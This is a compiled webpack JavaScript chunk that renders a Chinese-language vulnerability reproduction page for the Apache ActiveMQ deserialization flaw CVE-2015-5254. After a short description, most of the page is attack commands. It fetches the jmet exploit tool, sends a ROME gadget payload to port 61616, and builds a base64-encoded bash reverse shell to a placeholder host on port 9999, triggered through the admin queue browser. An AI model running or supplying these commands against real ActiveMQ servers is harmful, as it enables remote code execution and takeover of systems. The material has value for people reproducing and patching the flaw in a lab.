(window.webpackJsonp=window.webpackJsonp||[]).push([[262],{2533:function(a,s,t){a.exports=t.p+"assets/img/image-20220308145025293.23941f2e.png"},2534:function(a,s,t){a.exports=t.p+"assets/img/image-20220308145111363.49749ebb.png"},2535:function(a,s,t){a.exports=t.p+"assets/img/image-20220308145310216.ffeaa54f.png"},3264:function(a,s,t){"use strict";t.r(s);var e=t(64),r=Object(e.a)({},(function(){var a=this,s=a._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":a.$parent.slotKey}},[s("h1",{attrs:{id:"apache-activemq-反序列化漏洞-cve-2015-5254"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#apache-activemq-反序列化漏洞-cve-2015-5254"}},[a._v("#")]),a._v(" Apache ActiveMQ 反序列化漏洞 CVE-2015-5254")]),a._v(" "),s("h2",{attrs:{id:"漏洞描述"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[a._v("#")]),a._v(" 漏洞描述")]),a._v(" "),s("p",[a._v("Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务，集群，Spring Framework等。Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java消息服务（JMS）ObjectMessage对象利用该漏洞执行任意代码。")]),a._v(" "),s("h2",{attrs:{id:"漏洞影响"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[a._v("#")]),a._v(" 漏洞影响")]),a._v(" "),s("a-checkbox",{attrs:{checked:""}},[a._v("Apache ActiveMQ 5.13.0之前5.x版本")]),s("br"),a._v(" "),s("h2",{attrs:{id:"漏洞复现"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[a._v("#")]),a._v(" 漏洞复现")]),a._v(" "),s("a-alert",{attrs:{type:"success",message:"首先下载 jmet https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar",description:"",showIcon:""}}),a._v(" "),s("div",{staticClass:"language-shell line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-shell"}},[s("code",[s("span",{pre:!0,attrs:{class:"token function"}},[a._v("wget")]),a._v(" https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar\n"),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("mkdir")]),a._v(" external\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br")])]),s("p",[a._v("对目标发送一个生成"),s("code",[a._v("/tmp/vuln")]),a._v("的 payload")]),a._v(" "),s("div",{staticClass:"language-plain line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-plain"}},[s("code",[a._v('java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "touch /tmp/vuln" -Yp ROME xxx.xxx.xxx.xxx 61616\n')])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[a._v("访问 "),s("code",[a._v("http://xxx.xxx.xxx.xxx:8161/admin/browse.jsp?JMSDestination=event")]),a._v("可以看到多了一条消息队列")]),a._v(" "),s("p",[s("img",{attrs:{src:t(2533),alt:"image-20220308145025293"}})]),a._v(" "),s("p",[a._v("点击这个信息触发文件创建")]),a._v(" "),s("p",[s("img",{attrs:{src:t(2534),alt:"image-20220308145111363"}})]),a._v(" "),s("p",[a._v("成功执行命令创建文件，也可以创建一个"),s("code",[a._v("反弹shell")]),a._v("的payload")]),a._v(" "),s("div",{staticClass:"language-shell line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-shell"}},[s("code",[s("span",{pre:!0,attrs:{class:"token function"}},[a._v("bash")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-i")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v(">&")]),a._v(" /dev/tcp/xxx.xxx.xxx.xxx/9999 "),s("span",{pre:!0,attrs:{class:"token operator"}},[s("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[a._v("0")]),a._v(">")]),s("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[a._v("&1")]),a._v("  "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),a._v("base64编码"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),a._v("\nYmFzaCAtaSA+JiAvZGV2L3RjcC94eHgueHh4Lnh4eC54eHgvOTk5OSAwPiYx\n\n"),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("bash")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-c")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("{")]),a._v("echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eHgueHh4Lnh4eC54eHgvOTk5OSAwPiYx"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("}")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("|")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("{")]),a._v("base64,-d"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("}")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("|")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("{")]),a._v("bash,-i"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("}")]),a._v("\n\n发送payload\n"),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("java")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-jar")]),a._v(" jmet-0.1.0-all.jar "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-Q")]),a._v(" event "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-I")]),a._v(" ActiveMQ "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-s")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-Y")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eHgueHh4Lnh4eC54eHgvOTk5OSAwPiYx}|{base64,-d}|{bash,-i}"')]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-Yp")]),a._v(" ROME xxx.xxx.xxx.xxx "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("61616")]),a._v("\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br"),s("span",{staticClass:"line-number"},[a._v("3")]),s("br"),s("span",{staticClass:"line-number"},[a._v("4")]),s("br"),s("span",{staticClass:"line-number"},[a._v("5")]),s("br"),s("span",{staticClass:"line-number"},[a._v("6")]),s("br"),s("span",{staticClass:"line-number"},[a._v("7")]),s("br")])]),s("p",[a._v("同样点击消息队列会触发命令执行")]),a._v(" "),s("p",[s("img",{attrs:{src:t(2535),alt:"image-20220308145310216"}})])],1)}),[],!1,null,null,null);s.default=r.exports}}]);